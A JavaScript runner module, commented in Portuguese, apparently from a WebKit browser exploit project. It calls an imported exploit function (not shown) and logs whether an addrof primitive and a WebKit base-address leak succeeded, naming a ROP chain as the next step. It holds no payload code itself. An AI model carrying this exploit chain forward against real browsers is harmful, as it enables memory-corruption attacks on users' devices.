// js/script3/runAllAdvancedTestsS3.mjs (Runner para R47 - Varredura OOB)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R47 as executeTest, // Renomear para clareza
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R47_WEBKIT as FNAME_MODULE
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_OOBScan_R47() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_OOBScan_R47";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTest();
    const module_name_for_title = FNAME_MODULE;

    if (!result) {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
        logS3(`  RUNNER R47(OOBScan): Objeto de resultado inválido ou nulo recebido do teste.`, "critical", FNAME_RUNNER);
        return;
    }

    if (result.webkit_leak_result?.success) {
        logS3(`  --- SUCESSO FINAL! ---`, "success_major", FNAME_RUNNER);
        logS3(`    Primitiva de ADDROF: ${result.addrof_result?.success ? `CRIADA COM SUCESSO (${result.addrof_result.msg})` : 'FALHOU'}`, "good", FNAME_RUNNER);
        logS3(`    Endereço Base do WebKit Vazado: ${result.webkit_leak_result.webkit_base_candidate}`, "leak", FNAME_RUNNER);
        logS3(`    Próximo passo: Usar o endereço base vazado para construir uma ROP chain.`, "info_emphasis", FNAME_RUNNER);
        document.title = "Exploit Sucesso: Base do WebKit Vazada!";

    } else if (result.addrof_result?.success) {
        logS3(`  --- SUCESSO PARCIAL ---`, "vuln", FNAME_RUNNER);
        logS3(`    Primitiva de ADDROF: CRIADA COM SUCESSO.`, "good", FNAME_RUNNER);
        logS3(`    Endereço Vazado: ${result.addrof_result.leaked_object_addr}`, "leak", FNAME_RUNNER);
        logS3(`    Falha no WebKit Leak: ${result.webkit_leak_result?.msg || 'Não executado.'}`, "warn", FNAME_RUNNER);
        document.title = "Exploit Parcial: Addrof OK, WebKitLeak Falhou";
    }
    else {
        logS3(`  --- FALHA NO TESTE ---`, "critical", FNAME_RUNNER);
        logS3(`    Erro reportado: ${result.errorOccurred || 'Erro desconhecido'}`, "error", FNAME_RUNNER);
        logS3(`    Primitiva de ADDROF criada: ${result.addrof_result?.success || false}`, "warn", FNAME_RUNNER);
        document.title = "Exploit Falhou: Verifique Logs";
    }

    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator_OOBScan`;
    logS3(`==== INICIANDO Script 3 R47_OOBScan (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runHeisenbugReproStrategy_OOBScan_R47();
    
    logS3(`\n==== Script 3 R47_OOBScan (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
